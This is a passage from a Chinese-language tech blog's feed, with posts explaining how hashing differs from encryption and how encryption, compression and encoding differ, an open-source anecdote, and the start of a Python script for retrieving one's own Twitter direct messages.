&lt;p&gt;總之，目前應該還是會傾向 Web Back-end 和 DevOps 的部份吧，我自己是覺得算有興趣，至於 Data Analysis 和 Machine Learning 的部份也要找時間好好碰一下，算是有興趣，但在這份工作比較沒有機會接觸到。  &lt;/p&gt;</summary><category term="Job"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>加密和雜湊有什麼不一樣？</title><link href="https://blog.m157q.tw/posts/2017/12/25/differences-between-encryption-and-hashing/" rel="alternate"></link><published>2017-12-26T12:29:40+08:00</published><updated>2017-12-26T12:29:40+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-25:posts/2017/12/25/differences-between-encryption-and-hashing/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實雜湊（Hash）的部份，本來是打算放在 &lt;a href="/posts/2017/12/23/differences-between-encryption-compression-and-encoding/"&gt;如何區分加密、壓縮、編碼&lt;/a&gt; 這篇一起講。但在撰寫的過程中發覺雜湊跟其他三者相比起來的差異性較大，一起講其實蠻突兀的，不太好比較。而且我自己目前看到的狀況是，雜湊比較容易跟加密搞混，所以才獨立出這篇來講一下雜湊與加密的關係。  &lt;/p&gt;
&lt;p&gt;你可能或多或少都有看過或聽過「MD5 加密」、「MD5 解密」、「SHA-1 加密」、「SHA-1 解密」、「雜湊加密演算法」。但 MD5 和 SHA-1 實際上並不是加密演算法，而是雜湊演算法。究竟加密跟雜湊到底有什麼不一樣，又該如何區分，這篇會簡單講解一下。  &lt;/p&gt;
&lt;p&gt;因為加密的部份已經在 &lt;a href="/posts/2017/12/23/differences-between-encryption-compression-and-encoding/"&gt;如何區分加密、壓縮、編碼&lt;/a&gt; 這篇提過了，所以就不重述，還不清楚的人歡迎點擊上述文章連結前去察看。以下會先講雜湊的特性，再講雜湊跟加密的區別。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;雜湊（Hash）&lt;/h3&gt;
&lt;p&gt;其實雜湊在一些壓縮演算法或者排序演算法也都有用到，&lt;br /&gt;
但這邊只就資訊安全相關的部份進行討論。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;無論原文的內容長短，透過雜湊演算法運算完的輸出都會是固定的長度，即輸出的長度不受原文長度影響。  &lt;/li&gt;
&lt;li&gt;雜湊演算法的輸出又被稱做「雜湊值」（hash value）。  &lt;/li&gt;
&lt;li&gt;不同雜湊演算法的輸出長度不同。  &lt;/li&gt;
&lt;li&gt;兩個原文的內容即便只差一個字，雜湊演算法產生的兩個輸出內容卻會差非常多。  &lt;/li&gt;
&lt;li&gt;相同的內容作為相同雜湊演算法的輸入，得到的輸出必定一樣。  &lt;/li&gt;
&lt;li&gt;不同的內容作為相同雜湊演算法的輸入，得到的相同輸出的機率極低。  &lt;/li&gt;
&lt;li&gt;無法將雜湊演算法的輸出解回原本的輸入，雜湊是單向的。  &lt;ul&gt;
&lt;li&gt;但因為相同輸入會得到相同輸出，所以最常見的破解方法就是透過 brute-force 的方式，用程式把各種可能的輸入都餵給雜湊演算法，得到輸出後，把輸入跟輸出以及所使用的雜湊演算法記起來，成為一張對應表（被稱做 rainbow table，彩虹表）。  &lt;/li&gt;
&lt;li&gt;然後拿雜湊值去其使用之雜湊演算法的 rainbow table 找尋輸入值，因為 rainbow table 是可以一直累積的，所以理論上來說，只要 rainbow table 夠大的話，就能夠找到原始的輸入值。  &lt;/li&gt;
&lt;li&gt;所以資安實務上會再為原始資料加入 salt 之後，才會丟給雜湊演算法運算，獲得加了 salt 以後的雜湊值。  &lt;ul&gt;
&lt;li&gt;salt 基本上就是額外加入的字串，可以用固定的規則改變原本的輸入值。  &lt;/li&gt;
&lt;li&gt;這樣的好處是，就算被破解了，破解的人拿到的字串仍然不會是密碼，拿去登入是不會成功的。  &lt;/li&gt;
&lt;li&gt;但在比對使用者輸入的密碼時，一樣可以加了 salt 之後再進行雜湊去比對，仍然可以驗證密碼是否正確，而安全性會增加。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用途  &lt;ul&gt;
&lt;li&gt;檔案校驗碼（Checksum）  &lt;ul&gt;
&lt;li&gt;用來快速判斷檔案是否和原本相同。  &lt;/li&gt;
&lt;li&gt;有在論壇下載過檔案的人應該都很常見到一長串 MD5 或 SHA-1 驗證碼，就是用來讓你快速檢查你下載的檔案裡頭的內容，是不是跟上傳者上傳的檔案一樣。  &lt;/li&gt;
&lt;li&gt;不一樣的話可能就是你載錯檔案、檔案有毀損或檔案被人加料了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不需要被還原的資料  &lt;ul&gt;
&lt;li&gt;例如：避免明文儲存使用者密碼  &lt;ul&gt;
&lt;li&gt;避免直接儲存使用者的明文密碼，除了避免資料庫外洩時，攻擊者無需進一步運算就可以直接得到明文密碼外，一方面也是尊重使用者，因為正常情況下只有使用者知道自己的密碼。  &lt;/li&gt;
&lt;li&gt;要簡單判斷網站有沒有明文儲存你的密碼最簡單的兩個方法：  &lt;ul&gt;
&lt;li&gt;寄信給你的時候有沒有直接把密碼寫在內文。  &lt;/li&gt;
&lt;li&gt;忘記密碼的時候不是要求你或幫你重新設定密碼，而是直接告訴你你的密碼。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但因為相同原文透過相同的雜湊演算法會得到相同的輸出，所以可以在不明文儲存使用者密碼的情況下，確認使用者輸入的密碼是否正確。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;SHA 系列：  &lt;ul&gt;
&lt;li&gt;SHA-0  &lt;/li&gt;
&lt;li&gt;SHA-1  &lt;ul&gt;
&lt;li&gt;SHA-1 已經被證明不夠安全。（在可接受的時間範圍內，可以找到內容不相同輸入卻得到相同輸出。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHA-2  &lt;ul&gt;
&lt;li&gt;SHA-256  &lt;/li&gt;
&lt;li&gt;SHA-512  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SHA-3  &lt;ul&gt;
&lt;li&gt;SHA3-256  &lt;/li&gt;
&lt;li&gt;SHA3-512  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MD5  &lt;ul&gt;
&lt;li&gt;MD5 也已經被證明不夠安全。（在可接受的時間範圍內，可以找到內容不相同輸入卻得到相同輸出。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLAKE2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;就是一串拿來做檢查的字串，但根據使用需求可以有不同的用途。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;所以，為什麼雜湊不是加密？&lt;/h2&gt;
&lt;p&gt;我個人認為，雜湊和加密很容易被人搞混的原因，主要是因為，雜湊和加密通常是一起使用的，常常被拿在一起講，所以久而久之就搞混了。  &lt;/p&gt;
&lt;p&gt;但其實可以透過以下幾點來區分：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加密需要密鑰，且可以透過解密得到原文。（加密可逆）  &lt;/li&gt;
&lt;li&gt;雜湊不需密鑰，無法逆向解出原始輸入。（雜湊不可逆）  &lt;ul&gt;
&lt;li&gt;雖然可以透過額外儲存的 rainbow table 來找尋原始輸入，但彩虹表是預先計算並儲存下來的，而不是雜湊演算法本身的設計。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;舉例  &lt;ul&gt;
&lt;li&gt;今天如果我拿到一串密文，我是有辦法透過解密，得到原始的明文的，而且如果使用非對稱式加密的話，我甚至還可以驗證傳送方是不是本人（是否有被進行中間人攻擊）。  &lt;ul&gt;
&lt;li&gt;雜湊演算法在這裡也會被使用，通常會被拿來檢驗傳送的訊息是否有被更改過。  &lt;/li&gt;
&lt;li&gt;傳送方附上原始訊息經過某個雜湊演算法得出的雜湊值，接收方在解開這個訊息之後，會透過相同的雜湊演算法來驗證。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但如果是拿到一串雜湊值的話，理論上是無法逆向得到原始的明文的，根本無法拿來做資料的傳遞。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以別再說出「MD5 加密」、「MD5 解密」、「SHA-1 加密」、「SHA-1 解密」之類的話啦~  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;小測驗&lt;/h2&gt;
&lt;p&gt;如果這兩篇有看懂的話，應該就可以理解&lt;a href="https://mobile.twitter.com/orsonwang/status/944400953591021568"&gt;這個 tweet&lt;/a&gt; 在講什麼：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pkcs7 簽章使用 RSA 加密演算法對資料的 SHA256 雜湊值簽章，台灣的金融機構習慣對這簽章做 base64 編碼來避免古早用 Cobol 的系統以 ASCII 字碼接收而產生所有資料第 8 bit 都是 0 而引起的驗證錯誤。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dotblogs.com.tw/regionbbs/2017/09/21/hashing_is_not_encryption"&gt;[Security] 雜湊不是加密，雜湊不是加密，雜湊不是加密。 | 小朱® 的技術隨手寫 - 點部落&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.securityinnovationeurope.com/blog/page/whats-the-difference-between-hashing-and-encrypting"&gt;What is The Difference Between Hashing and Encrypting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E7%9B%90_(%E5%AF%86%E7%A0%81%E5%AD%A6)"&gt;鹽 (密碼學) - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Encryption"></category><category term="Hashing"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>我愛開源，因為會遇到路人幫我寫測試。</title><link href="https://blog.m157q.tw/posts/2017/12/24/i-love-open-source-because-someone-will-write-testings-for-me/" rel="alternate"></link><published>2017-12-26T12:05:12+08:00</published><updated>2017-12-26T12:05:12+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-24:posts/2017/12/24/i-love-open-source-because-someone-will-write-testings-for-me/</id><summary type="html">&lt;h2&gt;先講結論&lt;/h2&gt;
&lt;p&gt;感恩開源！讚嘆開源！（啥）【詳見附 1】  &lt;/p&gt;
&lt;h2&gt;故事內文&lt;/h2&gt;
&lt;p&gt;故事緣起於 9 月底的某個星期六晚上&lt;br /&gt;
因為太邊緣了沒人約&lt;br /&gt;
加上一時興起&lt;br /&gt;
於是花了幾個小時&lt;br /&gt;
用 Python 寫了個把文字從橫書轉成直書的小程式&lt;br /&gt;
詳情請見：&lt;a href="https://github.com/M157q/hor2vec"&gt;https://github.com/M157q/hor2vec&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;之後有收到些回饋&lt;br /&gt;
有人說想寫個 JavaScript 版&lt;br /&gt;
也有說人說想寫個 Rust 版  &lt;/p&gt;
&lt;p&gt;也有收到網友的訊息說&lt;br /&gt;
在隔幾天的十月初&lt;br /&gt;
日本知名的 GitHub 使用者 mattn&lt;br /&gt;
（在 GitHub 上有 3.6k followers，有用 Vim 和寫 Golang 的人應該對他的 id 不陌生）&lt;br /&gt;
也用 Golang 寫了一個用途一樣的程式&lt;br /&gt;
&lt;a href="https://github.com/mattn/tate"&gt;https://github.com/mattn/tate&lt;/a&gt;&lt;br /&gt;
裏面有些我沒有實作的功能可以參考看看  &lt;/p&gt;
&lt;p&gt;看了一下才知道&lt;br /&gt;
原來日文的平假名和片假名也有分全形和半形&lt;br /&gt;
然後連標點符號也可以從橫的轉成直的  &lt;/p&gt;
&lt;p&gt;於是我就開了幾個 issue 紀錄要新增的功能&lt;br /&gt;
然後因為我是測試苦手不太會寫測試&lt;br /&gt;
所以一開始就沒寫測試&lt;br /&gt;
於是就&lt;a href="https://github.com/M157q/hor2vec/issues/5"&gt;開了一個 issue 提醒我自己要寫測試&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;沒！想！到！&lt;br /&gt;
竟然收到一個路人的 pull request 幫我加上了測試&lt;br /&gt;
&lt;a href="https://github.com/M157q/hor2vec/pull/6"&gt;https://github.com/M157q/hor2vec/pull/6&lt;/a&gt;&lt;br /&gt;
花了 27 個 commits&lt;br /&gt;
更動了 400 多行程式碼&lt;br /&gt;
太神奇啦！&lt;br /&gt;
這種路過幫人寫測試的神奇小精靈哪裡找啊？  &lt;/p&gt;
&lt;p&gt;最神奇的還不只這個&lt;br /&gt;
重點是他的 27 個 commits 裡頭的內容之詳細&lt;br /&gt;
比他更改的程式碼還多行&lt;br /&gt;
實在是太令人賞心悅目&lt;br /&gt;
&lt;a href="https://github.com/M157q/hor2vec/pull/6/commits/0f67f0fe8be0312b08195b8157fac5f0be6c9830"&gt;https://github.com/M157q/hor2vec/pull/6/commits/0f67f0fe8be0312b08195b8157fac5f0be6c9830&lt;/a&gt;&lt;br /&gt;
於是我就忍不住在底下詢問他&lt;br /&gt;
到底是怎麼寫 commit message 的  &lt;/p&gt;
&lt;p&gt;他也很認真得&lt;a href="https://github.com/M157q/hor2vec/pull/6#issuecomment-343633972"&gt;給了一個很詳細的回覆&lt;/a&gt;&lt;br /&gt;
真的讓我很佩服&lt;br /&gt;
推薦對如何把 commit message 寫好有興趣的人點進去看一下  &lt;/p&gt;
&lt;p&gt;開源大法太神奇啦&lt;br /&gt;
竟然可以吸引到幫人寫測試的小精靈&lt;br /&gt;
感恩開源！讚嘆開源！&lt;br /&gt;
你在等什麼？&lt;br /&gt;
還不趕快加入開源的行列嗎？&lt;br /&gt;
搞不好你也可以找到你的開源小精靈並向對方學習喔！  &lt;/p&gt;
&lt;p&gt;（我好像該去 Review 他的 PR 了...）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;附錄&lt;/h2&gt;
&lt;p&gt;[1] 開源&lt;br /&gt;
全稱「開放源始碼」或「開放原始碼」&lt;br /&gt;
英文 "Open Source"，常被戲稱為「歐噴壽司」&lt;br /&gt;
（例句：「我今天放了一顆歐噴壽司，釣到一個路過的小精靈幫我寫測試，潮爽 der」）&lt;br /&gt;
為一種將程式原始程式碼公開讓人檢視、修改、散佈、使用的行為。&lt;br /&gt;
在台灣隸屬宗教為「開源大法教」（這是玩笑&lt;br /&gt;
教眾口號為「感恩開源！讚嘆開源！」（這也是玩笑&lt;br /&gt;
年度最大教眾聚會為「開源人年會」&lt;br /&gt;
英文全名為 Conference for Open Source Coders, Users and Promoters&lt;br /&gt;
簡稱「COSCUP」，常被戲稱為「餘弦杯」及常被誤認為台灣年度最大型 Cosplay 比賽&lt;br /&gt;
官方網址：&lt;a href="https://coscup.org"&gt;https://coscup.org&lt;/a&gt;  &lt;/p&gt;</summary><category term="Open Source"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>如何區分加密、壓縮、編碼</title><link href="https://blog.m157q.tw/posts/2017/12/23/differences-between-encryption-compression-and-encoding/" rel="alternate"></link><published>2017-12-25T17:49:55+08:00</published><updated>2017-12-25T17:49:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-23:posts/2017/12/23/differences-between-encryption-compression-and-encoding/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;base64 加密？base64 壓縮？base64 編碼？傻傻分不清？&lt;br /&gt;
究竟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;加密（Encrypt）  &lt;/li&gt;
&lt;li&gt;壓縮（Compress）  &lt;/li&gt;
&lt;li&gt;編碼（Encode）  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;到底有什麼差別？  &lt;/p&gt;
&lt;p&gt;明明不管是中文還是英文，&lt;br /&gt;
這 3 個詞長得一點都不像，&lt;br /&gt;
那到底為什麼很多人會把這 3 種東西都當成加密呢？  &lt;/p&gt;
&lt;p&gt;主要是因為透過這 3 種方式處理過後的資料，&lt;br /&gt;
都會長的跟原本不一樣，&lt;br /&gt;
一般人無法直接辨別，&lt;br /&gt;
就覺得是被加密處理過的密文天書。  &lt;/p&gt;
&lt;p&gt;然而，&lt;br /&gt;
並不是變成人看不懂的東西就叫作「加密」。&lt;br /&gt;
如果誤用的話，&lt;br /&gt;
很有可能你自以為加密了的東西，&lt;br /&gt;
實際上並沒有經過加密處理，&lt;br /&gt;
隨隨便便就可以被懂其中差異的人拿到你寶貴的原始文字（最有可能的就是你的密碼啦）。&lt;br /&gt;
以下就來簡單說明這 3 種東西各自的特性，&lt;br /&gt;
會特別拿 base64 來說，&lt;br /&gt;
希望能夠端正一下視聽。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;加密（Encryption）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;首先得產生一個新的字串作為密鑰，也就是一把鑰匙。  &lt;/li&gt;
&lt;li&gt;原文與密鑰作為加密演算法的輸入，得到的輸出即為加密過後的密文。  &lt;/li&gt;
&lt;li&gt;可以想像成，加密演算法幫你打造出你給它的這把密鑰才可以開啟的寶箱，幫你把原文放入寶箱後，用這把密鑰上鎖，上鎖後的寶盒就是密文，看不到裡面的東西是什麼。  &lt;/li&gt;
&lt;li&gt;這種只有一把鑰匙的加密演算法被稱為對稱式加密（Symmetric Encryption）。  &lt;/li&gt;
&lt;li&gt;問題也很明顯，要是你沒有保管好你的鑰匙，或者你的鑰匙構造太簡單被人打造出一模一樣的鑰匙，別人就可以打開寶箱，拿到內容物。  &lt;ul&gt;
&lt;li&gt;比如說你的密鑰是一個叫作 "5566" 的字串，因為太好猜了，所以很容易被解密回來。  &lt;/li&gt;
&lt;li&gt;這也是為什麼通常在生成密鑰的時候會建議長度愈長愈好，尤其現在電腦的運算能力愈來愈強，以往透過程式一個一個暴力猜測密鑰的方式，在相同單位時間內可以猜的數量變多了，密鑰長度太短的話，很容易就被猜到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為對稱式加密的安全性以及在實際應用上不夠理想，於是乎，出現了安全性更高，應用範圍更廣的非對稱式加密（Asymmetric Encryption）。  &lt;/li&gt;
&lt;li&gt;非對稱式加密演算法會有兩把鑰匙，一把稱做公鑰（可以公開），另一把稱做私鑰（自己要藏好）。  &lt;/li&gt;
&lt;li&gt;非對稱式加密除了可以做到加密以外，還可以生成數位簽章，確認密文的傳送方身份真的是本人，這篇不會細談。  &lt;/li&gt;
&lt;li&gt;但這並不代表對稱式加密就沒有人用，兩者各有各的優缺點，所以實際應用上通常都是視情況而定，常常會有兩者一起使用的情形。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;對稱式：DES, 3DES, AES  &lt;/li&gt;
&lt;li&gt;非對稱式：RSA, DSA, ECC  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;沒有這把鑰匙（無論是拿到或猜到）就無法得知真正的訊息。  &lt;/li&gt;
&lt;li&gt;使用 base64 的時候不需要密鑰，而且任何人編碼的 base64 訊息，任何人都可以經過 base64 解碼回來，所以 base64 不是加密。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;壓縮（Compression）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;輸入（通常是檔案）經過壓縮演算法後得到的輸出，大小比輸入來得小。  &lt;/li&gt;
&lt;li&gt;根據有無失真又區分為非破壞性（無損）壓縮與破壞性（有損）壓縮：  &lt;ul&gt;
&lt;li&gt;無損壓縮：無失真、壓縮率沒辦法到太高，通常用在文件檔案這種不能缺少原始資料的東西。  &lt;/li&gt;
&lt;li&gt;有損壓縮：失真、壓縮率可以比較高，通常用在圖片、視訊、音訊，因為可以去掉人眼或人耳無法辨認出差異的部份，降低檔案大小可以有效提升傳輸時的效率。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;zip, gzip, rar, 7zip, jpg, mp3, mp4, Huffman coding  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;沒有讓輸出比輸入小的演算法就不是壓縮。  &lt;/li&gt;
&lt;li&gt;經過 base64 編碼後得到的結果，實際上會比原檔案多三分之一左右，所以 base64 不是壓縮。  &lt;ul&gt;
&lt;li&gt;base64 使用 64 個可顯示的 ASCII 字元來表示二進位資料。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;2^6 = 64&lt;/code&gt;，也就是一個 base64 單元表示 6 位元，即用 1 個 ASCII 字元（8 bits），表示 6 bits 資料，比例為 &lt;code&gt;4:3&lt;/code&gt;，也就大概多了 &lt;code&gt;1/3&lt;/code&gt; 出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;那為什麼很多地方會提到在網頁上用 base64 表示圖片可以加速？  &lt;ul&gt;
&lt;li&gt;主要是因為把圖片直接以 base64 字串的形式呈現在網頁上的話，就不需要額外再發 request 去要圖片。  &lt;/li&gt;
&lt;li&gt;但因為 base64 會把檔案變大不少，所以很多人會先把圖片經過 gzip 壓縮後，再編碼成 base64 字串。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;編碼（Encoding）&lt;/h3&gt;
&lt;p&gt;編碼牽涉的範圍非常廣，&lt;br /&gt;
包含了：字元編碼（Character Encoding）、音訊編碼（Audio Encoding）、視訊編碼（Video Encoding）、…… 等等，&lt;br /&gt;
所以在這篇文章不會仔細講。&lt;br /&gt;
其實廣義上來說，&lt;br /&gt;
上述提到的加密與壓縮都算是編碼的其中一種，&lt;br /&gt;
但這裡就把上述兩個排除。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;將原文轉換成另外一種表達方式。  &lt;/li&gt;
&lt;li&gt;不需要密鑰，只要知道你用哪個編碼演算法，任何人都可以解碼。  &lt;ul&gt;
&lt;li&gt;這也是單純編碼被拿來誤用成加密演算法最危險的地方，因為完全不需要花時間猜密鑰。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不同的編碼演算法有不同的特性  &lt;ul&gt;
&lt;li&gt;錯誤偵測（Error Detection）  &lt;ul&gt;
&lt;li&gt;檢查訊息在經過傳送後是否已經改變。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;錯誤校正（Error Correction）  &lt;ul&gt;
&lt;li&gt;自動修正在經過傳送後錯誤的內容。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;方便資料進行傳輸  &lt;ul&gt;
&lt;li&gt;以不同的形式表示相同的資料。  &lt;/li&gt;
&lt;li&gt;例如: base64 就把二進位的資料用 ASCII 來表示。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見演算法  &lt;ul&gt;
&lt;li&gt;base64, urlencode, hamming code,  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;有密鑰：加密  &lt;/li&gt;
&lt;li&gt;輸出比輸入小：壓縮  &lt;/li&gt;
&lt;li&gt;其他：編碼  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Encryption"></category><category term="Compression"></category><category term="Encoding"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>用 Python 寫個程式抓出我在 Twitter 上存了哪些 tweet</title><link href="https://blog.m157q.tw/posts/2017/12/22/write-a-python-script-to-retrieve-twitter-direct-messsages/" rel="alternate"></link><published>2017-12-24T22:58:08+08:00</published><updated>2017-12-24T22:58:08+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-22:posts/2017/12/22/write-a-python-script-to-retrieve-twitter-direct-messsages/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;身為一個邊緣人，&lt;br /&gt;
沒有 Instagram 帳號，&lt;br /&gt;
卻有台灣沒什麼人用的 Twitter 帳號也是很合理的。  &lt;/p&gt;
&lt;p&gt;其實 Twitter 上很容易得到國外第一手即時資訊，&lt;br /&gt;
常常看到好幾天之後才在 Facebook 或台灣的媒體看到消息，&lt;br /&gt;
很適合我這種資訊焦慮症的人（？  &lt;/p&gt;
&lt;p&gt;Twitter 也很容易跟一些很有名的人直接交流，&lt;br /&gt;
像上一篇翻譯文章的授權，&lt;br /&gt;
我就是直接在 Twitter 上問作者，&lt;br /&gt;
大概五分鐘之內，沒錯，就是短短幾分鐘之內，就收到作者同意的回覆。  &lt;/p&gt;
&lt;p&gt;總之，&lt;br /&gt;
我平常在用 Twitter 的時候有個習慣，&lt;br /&gt;
就是把我看到覺得值得保留下來的 tweet 分成兩類，&lt;br /&gt;
一類是比較不嚴肅的，把該 tweet 私訊給自己。&lt;br /&gt;
另一類是比較嚴肅的，把該 tweet 私訊給另外一個 RSS bot 帳號。&lt;br /&gt;
（這個 RSS bot 有機會的話會發篇文章講一下）  &lt;/p&gt;
&lt;p&gt;這裡要來用 Python 寫個程式，&lt;br /&gt;
把今年存下來的這兩大類 tweet 抓出來，&lt;br /&gt;
其實我不確定是不是一定會成功，&lt;br /&gt;
大概只有 87% 的把握，&lt;br /&gt;
總之接下來就一步步講一下要怎麼做。  &lt;/p&gt;
&lt;p&gt;（謎之音：最愛寫這種無用的小程式了。）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;步驟&lt;/h2&gt;
&lt;h3&gt;看有哪個 API 可以拿來用&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.twitter.com/en/docs/direct-messages/sending-and-receiving/api-reference/list-events"&gt;GET direct_messages/events/list — Twitter Developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最多只能抓取最近的 200 則私訊（不限 30 天內。）  &lt;/li&gt;
&lt;li&gt;如果超過 200 則的話，只能抓取最近 30 天內的私訊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;取得 Access Token&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;到 &lt;a href="https://apps.twitter.com/"&gt;https://apps.twitter.com/&lt;/a&gt; 建立一個新的 App。  &lt;/li&gt;
&lt;li&gt;記下 Consumer Key (API Key) 和 Consumer Secret (API Secret)  &lt;/li&gt;
&lt;li&gt;點選 Permissions  &lt;ul&gt;
&lt;li&gt;選取 Read, Write and Access direct messages。（原本只有 Read, Write）  &lt;/li&gt;
&lt;li&gt;選好之後按底下的 Update Settings  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;點進去剛建立的 App，移到底下，點選建立 Access Token。  &lt;/li&gt;
&lt;li&gt;記下 Access Token 和 Access Token Secret  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;安裝要使用的 Python 套件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/bear/python-twitter"&gt;https://github.com/bear/python-twitter&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pip install python-twitter&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;撰寫程式&lt;/h3&gt;
&lt;p&gt;因為兩個的作法類似，&lt;br /&gt;
這邊就以抓出比較嚴肅一點的 tweet 作為範例，&lt;br /&gt;
幾行就可以寫完了。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3  &lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;  

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;twitter&lt;/span&gt;  


&lt;span class="c1"&gt;# Fill these contants by yourself.  &lt;/span&gt;
&lt;span class="n"&gt;CONSUMER_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;CONSUMER_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;ACCESS_TOKEN_KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  
